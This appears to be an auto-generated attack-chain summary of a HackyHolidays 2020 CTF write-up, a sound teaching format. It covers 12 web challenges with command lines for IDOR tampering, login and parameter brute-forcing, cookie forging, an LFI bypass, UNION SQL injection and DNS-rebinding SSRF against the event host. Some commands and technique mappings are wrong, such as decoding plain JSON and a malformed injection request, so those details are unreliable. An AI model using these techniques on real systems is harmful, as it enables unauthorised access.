---
tags:
  - ctf
  - web
  - idor
  - bruteforce
  - lfi
  - ssti
  - sqli
  - ssrf
  - buffer-overflow
  - weak-crypto
type: attack_chain
tools:
  - '[[tools/Wfuzz]]'
  - '[[tools/Scout]]'
  - '[[tools/JQ]]'
  - '[[tools/Base64]]'
  - '[[tools/Fcrackzip]]'
  - '[[tools/Curl]]'
  - '[[tools/Browser-Dev-Tools]]'
  - '[[tools/Python]]'
  - '[[tools/Go]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
  - '[[Collection]]'
  - '[[Command and Control]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Enumerate-Robots-Txt-for-Information-Disclosure]]'
  - '[[procedures/Inspect-DOM-for-Hidden-Content-Extraction]]'
  - '[[procedures/Exploit-IDOR-in-People-Rater-via-Base64-Decoding]]'
  - '[[procedures/Fuzz-API-Endpoints-and-Extract-UUID-for-IDOR]]'
  - '[[procedures/Brute-Force-Credentials-and-Manipulate-Base64-Cookie]]'
  - '[[procedures/Bypass-LFI-Filters-to-Read-Arbitrary-PHP-Files]]'
  - '[[procedures/Exploit-SSTI-in-Hate-Mail-Generator-Markup-Field]]'
  - '[[procedures/Extract-Leaked-DB-Credentials-from-GitHub-Repo]]'
  - '[[procedures/Blind-SQL-Injection-to-Extract-Admin-Password]]'
  - '[[procedures/Buffer-Overflow-in-Age-Field-for-Privilege-Escalation]]'
  - '[[procedures/Chain-SQLi-and-SSRF-for-Internal-API-Brute-Forcing]]'
  - '[[procedures/Brute-Force-Salt-and-DNS-Rebinding-for-DDoS-Bypass]]'
step_count: 12
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
  - '[[File and Directory Discovery]]'
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:24:55.614Z'
description: >-
  Comprehensive walkthrough of exploiting 12 interconnected web challenges in
  the HackyHolidays 2020 CTF, revealing flags through enumeration, IDOR,
  brute-forcing, LFI, SSTI, SQLi, buffer overflow, SSRF, and weak cryptography
  to demonstrate full platform compromise.
id: d6729e58-51a6-4cde-bd2a-7416dd728256
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
  - '[[Collection]]'
  - '[[Command and Control]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
  - '[[File and Directory Discovery]]'
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# HackyHolidays 2020 CTF: Solving 12 Web Challenges via Enumeration Injection and Exploitation

This attack chain outlines the systematic exploitation of 12 web-based challenges from the HackyHolidays 2020 CTF hosted on an AWS-like platform. Starting with basic enumeration to uncover flags in accessible files, the chain progresses through advanced techniques like IDOR, API fuzzing, credential brute-forcing, LFI bypasses, SSTI injections, leaked credential extraction, blind SQLi, buffer overflows, chained SQLi-SSRF, and DNS rebinding to bypass protections. Each step builds reconnaissance and access, culminating in full flag disclosure across the platform.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 12 |
| Execution Time | ~120 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Enumeration & Discovery] --> B[IDOR & API Exploitation]
    B --> C[Brute-Force & Auth Bypass]
    C --> D[Injection & Inclusion Attacks]
    D --> E[Credential Leaks & SQLi]
    E --> F[Overflow & Chained Exploits]
    F --> G[Rebinding & DDoS Bypass]
    G --> H[Flag Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#e67e22
    style F fill:#1abc9c
    style G fill:#34495e
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Curl]]
- [[tools/Wfuzz]]
- [[tools/Scout]]
- [[tools/Browser-Dev-Tools]]
- [[tools/Fcrackzip]]
- [[tools/Python]]
- [[tools/Go]]

### Target Environment

- Web platform on port 80 (HTTP)
- Services: Apache, MySQL
- Tech stack: PHP, JavaScript, HTML, jQuery
- Network access: Direct internet access to https://hackyholidays.h1ctf.com

### Initial Access Requirements

- No prior credentials needed
- Public-facing web application
- Standard browser and command-line tools

## Detailed Attack Procedures

### Step 1: Basic Enumeration for Flag Discovery
procedure: [[procedures/Enumerate-Robots-Txt-for-Information-Disclosure]]

**Objective**: Identify exposed files containing flags through standard web enumeration.

**Instructions**: Navigate to the target site's root and access the robots.txt file directly using a browser or [[commands/curl-access-robots-txt]].

```bash
curl https://hackyholidays.h1ctf.com/robots.txt
```

**Expected Output**: Plaintext flag in the file content.

**Success Indicators**:
- Flag visible in response
- No authentication required

### Step 2: DOM Inspection for Hidden Content
procedure: [[procedures/Inspect-DOM-for-Hidden-Content-Extraction]]

**Objective**: Uncover obscured flags hidden in the page's DOM structure.

**Instructions**: Visit the /moved endpoint, open browser developer tools, and inspect the HTML source for comments or hidden elements containing the flag.

**Expected Output**: Flag revealed in HTML comment or obscured element.

**Success Indicators**:
- Flag extracted from source code
- No network requests needed beyond page load

### Step 3: IDOR Exploitation via Base64 Decoding
procedure: [[procedures/Exploit-IDOR-in-People-Rater-via-Base64-Decoding]]

**Objective**: Access unauthorized user entries by decoding and modifying ID parameters.

**Instructions**: Intercept the id parameter, decode it using [[commands/base64-decode-json-id]], modify the JSON id value, re-encode, and submit to access the admin entry.

```bash
echo '{"id":1}' | base64 -d
```

**Expected Output**: Decoded JSON {"id":1}, modify to target Grinch entry.

**Success Indicators**:
- Access to admin data
- Flag in response

### Step 4: API Fuzzing and UUID Extraction for IDOR
procedure: [[procedures/Fuzz-API-Endpoints-and-Extract-UUID-for-IDOR]]

**Objective**: Discover hidden API endpoints and extract user identifiers for unauthorized access.

**Instructions**: Fuzz the API base URL with [[tools/Scout]] using [[commands/scout-fuzz-api-endpoints]], decode sessions with [[commands/curl-decode-sessions-jq]], fuzz parameters with [[commands/wfuzz-fuzz-user-params]], then retrieve user data using [[commands/curl-retrieve-user-uuid]].

```bash
scout url -s https://hackyholidays.h1ctf.com/swag-shop/api
curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq
wfuzz --hc=400 -z file,wordlists/params.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

**Expected Output**: Endpoints /user and /sessions discovered; UUID extracted; User JSON with flag.

**Success Indicators**:
- Valid UUID obtained
- Flag in user response

### Step 5: Credential Brute-Forcing and Cookie Manipulation
procedure: [[procedures/Brute-Force-Credentials-and-Manipulate-Base64-Cookie]]

**Objective**: Enumerate and brute-force login credentials, then escalate privileges via cookie tampering.

**Instructions**: Brute-force username with [[commands/wfuzz-brute-username]], password with [[commands/wfuzz-brute-password]], encode modified admin cookie using [[commands/base64-encode-admin-cookie]], download and crack ZIP with [[commands/fcrackzip-crack-zip]].

```bash
wfuzz -z file,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login
wfuzz -z file,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login
echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip
```

**Expected Output**: Username 'access', password 'computer'; Encoded cookie; ZIP password 'hahahaha'.

**Success Indicators**:
- Successful login
- Admin access granted
- Flag in ZIP

### Step 6: LFI Bypass for Arbitrary File Read
procedure: [[procedures/Bypass-LFI-Filters-to-Read-Arbitrary-PHP-Files]]

**Objective**: Exploit local file inclusion to read sensitive PHP source and admin files.

**Instructions**: Test LFI with [[commands/curl-lfi-index-php]], then bypass filters using crafted parameter in [[commands/curl-lfi-bypass-admin]].

```bash
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=index.php
curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
```

**Expected Output**: PHP source code; Flag in admin file HTML.

**Success Indicators**:
- Source code displayed
- Flag grep'd from response

### Step 7: SSTI Exploitation in Markup Field
procedure: [[procedures/Exploit-SSTI-in-Hate-Mail-Generator-Markup-Field]]

**Objective**: Inject server-side templates to access admin-only content.

**Instructions**: Use browser dev tools to modify the markup field, injecting {{name}} variable referencing admin template.

**Expected Output**: Admin template rendered with flag.

**Success Indicators**:
- Unauthorized content displayed
- Flag visible

### Step 8: Leaked Credential Extraction from GitHub
procedure: [[procedures/Extract-Leaked-DB-Credentials-from-GitHub-Repo]]

**Objective**: Recover database credentials from exposed source code repository.

**Instructions**: Search GitHub repo commit history for the forum software, identify committed DB creds, access phpMyAdmin, extract MD5 hashes, and crack 'grinch' hash via online search (BahHumbug).

**Expected Output**: Login to forum admin post with flag.

**Success Indicators**:
- phpMyAdmin access
- Hashes cracked
- Flag in post

### Step 9: Blind SQL Injection for Password Extraction
procedure: [[procedures/Blind-SQL-Injection-to-Extract-Admin-Password]]

**Objective**: Use time-based blind SQLi to enumerate admin credentials.

**Instructions**: Confirm SQLi with sleep injection, then run custom script [[commands/python-quiz-blind-sqli]] to extract password char-by-char.

```bash
./quiz.py
```

**Expected Output**: Password 'S3creT_p4ssw0rd-$'.

**Success Indicators**:
- Delay confirms SQLi
- Full password extracted
- Admin login success

### Step 10: Buffer Overflow for Admin Escalation
procedure: [[procedures/Buffer-Overflow-in-Age-Field-for-Privilege-Escalation]]

**Objective**: Overflow string buffer to manipulate admin flag via field parsing.

**Instructions**: Submit age=1e3 (scientific notation bypasses length check), lastname=YYYYYYYYYYYYYYY (15 chars overflow).

**Expected Output**: Admin=Y set, access to admin.php flag.

**Success Indicators**:
- Overflow triggers
- Admin panel unlocked

### Step 11: Chained SQLi and SSRF for Credential Brute-Forcing
procedure: [[procedures/Chain-SQLi-and-SSRF-for-Internal-API-Brute-Forcing]]

**Objective**: Combine SQLi for SSRF to access internal API and brute-force creds.

**Instructions**: Dump schema with [[commands/curl-sqli-schema-dump]], exploit SSRF in picture endpoint, brute usernames with [[commands/python-brute-credentials]].

```bash
curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd' UNION SELECT 1,2,group_concat(concat(table_name,':',column_name)) from information_schema.columns WHERE table_schema='recon';/*'
./brute.py
```

**Expected Output**: DB structure; Username 'grinchadmin', password 's4nt4sucks'.

**Success Indicators**:
- Internal API responses
- Valid creds found

### Step 12: Salt Brute-Forcing and DNS Rebinding for DDoS
procedure: [[procedures/Brute-Force-Salt-and-DNS-Rebinding-for-DDoS-Bypass]]

**Objective**: Crack weak salt to craft payloads and bypass IP checks via rebinding.

**Instructions**: Brute salt with [[commands/go-salt-bruteforce]], generate hash with [[commands/echo-md5-payload-hash]], use DNS rebind domain for 127.0.0.1 target.

```bash
./salt.go
echo -n "mrgrinch463127.0.0.1" | md5sum
```

**Expected Output**: Salt 'mrgrinch463'; Hash '3e3f8df1658372edf0214e202acb460b'; DDoS triggers flag.

**Success Indicators**:
- Salt cracked
- Localhost targeted
- Flag revealed

## Attack Chain Summary

### Key Achievements

1. Uncovered 12 flags across diverse vulnerabilities
2. Demonstrated chaining of recon, injection, and bypass techniques
3. Achieved full platform enumeration and exploitation without prior access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery
- [[Brute Force]] Brute Force
- [[Valid Accounts]] Valid Accounts
- [[File and Directory Discovery]] File and Directory Discovery
- [[JavaScript]] JavaScript for SSTI
- [[Unsecured Credentials]] Unsecured Credentials
- [[Exploitation for Client Execution]] Exploitation for Client Execution (Buffer Overflow)
- [[Network Denial of Service]] Network Denial of Service

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery
- [[Lateral Movement]] Lateral Movement
- [[Collection]] Collection
- [[Command and Control]] Command and Control

---
*Last updated: 2023-10-01T00:00:00Z*
